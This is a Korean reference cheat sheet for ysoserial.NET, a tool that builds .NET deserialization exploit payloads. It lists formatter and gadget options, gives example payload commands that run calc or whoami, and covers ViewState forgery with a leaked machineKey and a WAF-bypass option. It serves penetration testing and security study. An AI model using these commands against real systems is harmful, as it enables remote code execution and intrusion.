# ysoserial.NET

- ysoserial.NET — .NET 역직렬화 취약점용 페이로드 생성기. Java의 ysoserial과는 별개 프로젝트로, 가젯(gadget)+포맷터(formatter) 조합으로 직렬화 페이로드를 만들어 exe로 배포된다.
- machineKey 유출 후 ViewState 위조가 필요할 때(-p ViewState), BinaryFormatter·Json.NET 등을 쓰는 .NET 앱의 역직렬화 취약점을 악용할 때, DotNetNuke 같은 제품별 플러그인(-p)이 필요할 때.
- ysoserial.exe(.NET Framework 실행 환경 — 공격자 PC에서 생성), 취약한 .NET 앱, ViewState라면 web.config의 machineKey 재료.

## 기본 구조

```
ysoserial.exe -f <formatter> -g <gadget> -c "<command>" -o <output>
```

- `-f`: 포맷터. BinaryFormatter, Json.Net, LosFormatter, NetDataContractSerializer, ObjectStateFormatter 등.
- `-g`: 가젯. ObjectDataProvider, TextFormattingRunProperties, PSObject, WindowsIdentity, ClaimsPrincipal 등.
- `-c`: 실행할 명령. 기본으로 cmd /c가 앞에 붙는다. 붙이지 않으려면 --rawcmd.
- `-o`: 출력 형식. raw, base64, raw-urlencode, base64-urlencode, hex.
- `-t`: 만든 페이로드를 로컬에서 즉시 실행해 테스트(calc 확인용).
- `--minify --ust`: 페이로드 압축(FormatterAssemblyStyle=Simple 타깃 대응).
- `--bgc <가젯>`: 브리지 가젯 체인. 콤마로 연결(예: Exchange CVE-2021-42321의 ClaimsPrincipal + ActivitySurrogateDisableTypeCheck).

## 대표 예시

```
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
ysoserial.exe -p DotNetNuke -m run_command -c calc.exe
cat cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
```

- 복잡한 명령(;|& 포함)은 `-s`(stdin)로 넘겨야 셸에 먹히지 않는다.

## ViewState 생성 (plugin)

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg="SHA1" --validationkey="<validationKey>" --generator="<GUID>"
```

- `--validationalg`: SHA1·HMACSHA256·3DES·AES 등. web.config의 validation 설정에 맞춘다.
- `--validationkey`: machineKey의 validationKey. `--decryptionalg`·`--decryptionkey`도 함께 지정 가능.
- `--generator`: __VIEWSTATEGENERATOR 값(HEX, .NET <= 4.0). 지정하면 legacy 모드로 --path·--apppath를 무시.
- `--path /app/page.aspx`·`--apppath`: .NET 4.5+ 타깃용. `--viewstateuserkey`: ViewStateUserKey(anti-CSRF) 대응.
- `--islegacy`: 구형 알고리즘 사용. `--isencrypted`: legacy에서 WAF 우회용 암호화. `--isdebug`: 디버그 출력.
- 결과는 POST 바디의 __VIEWSTATE 필드에 넣는 형태로 나온다.

## 팁·트러블슈팅

- 페이로드가 안 터지면 포맷터가 타깃과 다른 것부터 의심한다. `--sf`로 가젯 검색, `--raf`로 전체 포맷터 시험.
- .NET 4.8+ 등 최신 버전에서는 일부 가젯(ActivitySurrogate 계열)이 막혀 있다. --bgc 브리지나 다른 가젯으로 대체.
- XmlSerializer·DataContractSerializer 페이로드는 루트 노드 type 속성에 타깃 예상 타입이 들어가므로 상황에 맞게 수정이 필요하다.
- Java ysoserial(JAR)과는 가젯·포맷터 체계가 완전히 다르다. .NET 대상에는 ysoserial.exe를 쓴다.
